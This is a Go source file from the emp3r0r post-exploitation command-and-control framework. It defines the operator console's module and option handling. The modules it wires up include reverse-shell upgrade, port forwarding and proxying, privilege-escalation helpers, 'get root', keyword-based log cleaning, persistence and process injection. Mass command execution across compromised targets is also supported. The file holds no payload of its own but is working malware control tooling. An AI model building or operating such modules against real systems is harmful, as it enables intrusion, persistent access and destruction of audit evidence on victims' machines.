package cc

import (
	"strconv"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/lib/agent"
)

// Option all necessary info of an option
type Option struct {
	Name string   // like `module`, `target`, `cmd_to_exec`
	Val  string   // the value to use
	Vals []string // possible values
}

var (
	// CurrentMod selected module
	CurrentMod = "<blank>"

	// CurrentTarget selected target
	CurrentTarget *agent.SystemInfo

	// Options currently available options for `set`
	Options = make(map[string]*Option)

	// ShellHelpInfo provide utilities like ps, kill, etc
	ShellHelpInfo = map[string]string{
		HELP:      "Display this help",
		"upgrade": "A fully interactive reverse shell from HTTP2 tunnel, type `exit` to leave",
		"#ps":     "List processes: `ps`",
		"#kill":   "Kill process: `kill <PID>`",
		"#net":    "Show network info",
		"put":     "Put a file from CC to agent: `put <local file> <remote path>`",
		"get":     "Get a file from agent: `get <remote file>`",
	}

	// ModuleHelpers a map of module helpers
	ModuleHelpers = map[string]func(){
		agent.ModCMD_EXEC:     moduleCmd,
		agent.ModSHELL:        moduleShell,
		agent.ModPROXY:        moduleProxy,
		agent.ModPORT_FWD:     modulePortFwd,
		agent.ModLPE_SUGGEST:  moduleLPE,
		agent.ModGET_ROOT:     moduleGetRoot,
		agent.ModCLEAN_LOG:    moduleLogCleaner,
		agent.ModPERSISTENCE:  modulePersistence,
		agent.ModVACCINE:      moduleVaccine,
		agent.ModINJECTOR:     moduleInjector,
		agent.ModREVERSEPROXY: moduleReverseProxy,
	}
)

// SetOption set an option to value, `set` command
func SetOption(args []string) {
	if len(args) < 2 {
		return
	}

	opt := args[0]
	val := args[1:] // in case val contains spaces

	if _, exist := Options[opt]; !exist {
		CliPrintError("No such option: %s", strconv.Quote(opt))
		return
	}

	// set
	Options[opt].Val = strings.Join(val, " ")
}

// UpdateOptions add new options according to current module
func UpdateOptions(modName string) (exist bool) {
	// filter user supplied option
	for mod := range ModuleHelpers {
		if mod == modName {
			exist = true
			break
		}
	}
	if !exist {
		CliPrintError("UpdateOptions: no such module: %s", modName)
		return
	}

	// help us add new Option to Options, if exists, return the *Option
	addIfNotFound := func(key string) *Option {
		if _, exist := Options[key]; !exist {
			Options[key] = &Option{Name: key, Val: "<blank>", Vals: []string{}}
		}
		return Options[key]
	}

	var currentOpt *Option
	switch {
	case modName == agent.ModCMD_EXEC:
		currentOpt = addIfNotFound("cmd_to_exec")
		currentOpt.Vals = []string{
			"id", "whoami", "ifconfig",
			"ip a", "arp -a",
			"ps -ef", "lsmod", "ss -antup",
			"netstat -antup", "uname -a",
		}

	case modName == agent.ModPORT_FWD:
		// rport
		portOpt := addIfNotFound("to")
		portOpt.Vals = []string{"127.0.0.1:22", "127.0.0.1:8080"}
		// listen on port
		lportOpt := addIfNotFound("listen_port")
		lportOpt.Vals = []string{"8080", "1080", "22", "23", "21"}
		// on/off
		switchOpt := addIfNotFound("switch")
		switchOpt.Vals = []string{"on", "off", "reverse"}
		switchOpt.Val = "on"

	case modName == agent.ModCLEAN_LOG:
		// keyword to clean
		keywordOpt := addIfNotFound("keyword")
		keywordOpt.Vals = []string{"root", "admin"}

	case modName == agent.ModPROXY:
		portOpt := addIfNotFound("port")
		portOpt.Vals = []string{"1080", "8080", "10800", "10888"}
		portOpt.Val = "8080"
		statusOpt := addIfNotFound("status")
		statusOpt.Vals = []string{"on", "off", "reverse"}
		statusOpt.Val = "on"

	case modName == agent.ModLPE_SUGGEST:
		currentOpt = addIfNotFound("lpe_helper")
		for name := range LPEHelpers {
			currentOpt.Vals = append(currentOpt.Vals, name)
		}
		currentOpt.Val = "lpe_les"

	case modName == agent.ModINJECTOR:
		pidOpt := addIfNotFound("pid")
		pidOpt.Vals = []string{"0"}
		pidOpt.Val = "0"
		methodOpt := addIfNotFound("method")
		methodOpt.Vals = []string{"gdb", "native", "python"}
		methodOpt.Val = "native"

	case modName == agent.ModREVERSEPROXY:
		pidOpt := addIfNotFound("addr")
		pidOpt.Vals = []string{"127.0.0.1"}
		pidOpt.Val = "<blank>"

	case modName == agent.ModPERSISTENCE:
		currentOpt = addIfNotFound("method")
		methods := make([]string, len(agent.PersistMethods))
		i := 0
		for k := range agent.PersistMethods {
			methods[i] = k
			i++
		}
		currentOpt.Vals = methods
		currentOpt.Val = "all"
	}

	return
}

// ModuleRun run current module
func ModuleRun() {
	if CurrentTarget == nil {
		if CurrentMod == agent.ModCMD_EXEC {
			if !CliYesNo("Run on all targets") {
				CliPrintError("Target not specified")
				return
			}
			ModuleHelpers[agent.ModCMD_EXEC]()
			return
		}
		CliPrintError("Target not specified")
		return
	}
	if Targets[CurrentTarget] == nil {
		CliPrintError("Target (%s) does not exist", CurrentTarget.Tag)
		return
	}

	mod := ModuleHelpers[CurrentMod]
	if mod != nil {
		mod()
	} else {
		CliPrintError("Module %s not found", strconv.Quote(CurrentMod))
	}
}

// SelectCurrentTarget check if current target is set and alive
func SelectCurrentTarget() (target *agent.SystemInfo) {
	// find target
	target = CurrentTarget
	if target == nil {
		CliPrintError("SelectCurrentTarget: Target does not exist")
		return nil
	}

	// write to given target's connection
	tControl := Targets[target]
	if tControl == nil {
		CliPrintError("SelectCurrentTarget: agent control interface not found")
		return nil
	}
	if tControl.Conn == nil {
		CliPrintError("SelectCurrentTarget: agent is not connected")
		return nil
	}

	return
}
